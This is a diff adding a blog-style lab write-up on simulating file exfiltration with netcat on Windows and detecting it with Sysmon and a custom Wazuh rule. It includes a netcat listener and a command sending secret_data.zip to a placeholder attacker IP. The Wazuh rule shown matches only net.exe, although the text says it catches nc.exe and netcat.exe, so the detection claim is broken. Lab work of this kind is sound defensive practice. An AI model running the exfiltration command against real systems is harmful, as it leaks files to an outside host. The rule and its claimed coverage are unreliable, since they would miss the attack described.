@@ -1,0 +1,41 @@
+📌 Overview
+Data exfiltration is one of the final stages of a cyberattack, where an attacker extracts sensitive information from a compromised system to an external location they control. 
+Attackers often use native tools (like net.exe, certutil.exe, PowerShell, or nc.exe) to transfer data covertly and avoid detection.
+In this scenario, I simulated data exfiltration using netcat (nc.exe) and detected the activity using a custom Wazuh rule triggered by Sysmon Event ID 3 — which logs outbound network connections.
+
+🎯 Objective
+1- Simulate data exfiltration using netcat (nc.exe) on Windows.
+2- Detect network connections initiated by suspicious binaries like net.exe or nc.exe.
+3- Trigger a high-severity alert in Wazuh.
+
+🧪 Test Scenario
+🔻 Attacker Machine (Listening for exfil data)
+.\nc64.exe -lvp 8080 > received.zip
+This sets up a netcat listener on port 8080 to receive a ZIP file.
+
+🔺 Victim Machine (Exfiltrating the file)
+.\nc64.exe 192.168.X.X 8080 < C:\Users\Public\Documents\secret_data.zip
+This command uses Netcat to transfer a ZIP file to the attacker's IP using raw TCP.
+
+⚙️ Detection Mechanism
+Sysmon is configured to monitor process creation and network connections. 
+When the victim initiates a connection using nc.exe, it generates Sysmon Event ID 3, which logs the connection metadata including the executable used and the destination IP/port.
+Wazuh then uses custom rules to analyze this log and raise an alert when specific conditions are met.
+
+📜 Wazuh Custom Detection Rule
+<group name="net_connection_monitoring,sysmon,custom"> 
+  <rule id="100060" level="12">
+    <if_sid>61603</if_sid> <!-- Sysmon ID 3: Network connection -->
+    <field name="win.eventdata.image" type="pcre2">(?i)\\net\.exe</field>
+    <description>⚠ Network connection initiated by net.exe — possible system-level command</description>
+    <mitre>
+      <id>T1041</id> 
+    </mitre>
+  </rule>
+</group>
+✅ This rule directly matches Event ID 3 and uses a case-insensitive regex to catch executions of nc.exe or netcat.exe.
+
+✅ Conclusion
+This test demonstrates how attackers can use tools like nc.exe for stealthy data exfiltration and how Wazuh, paired with Sysmon, can detect such behavior using custom rules. 
+By focusing on executable patterns and outbound traffic characteristics, we can proactively monitor and alert on potential data breaches.
+
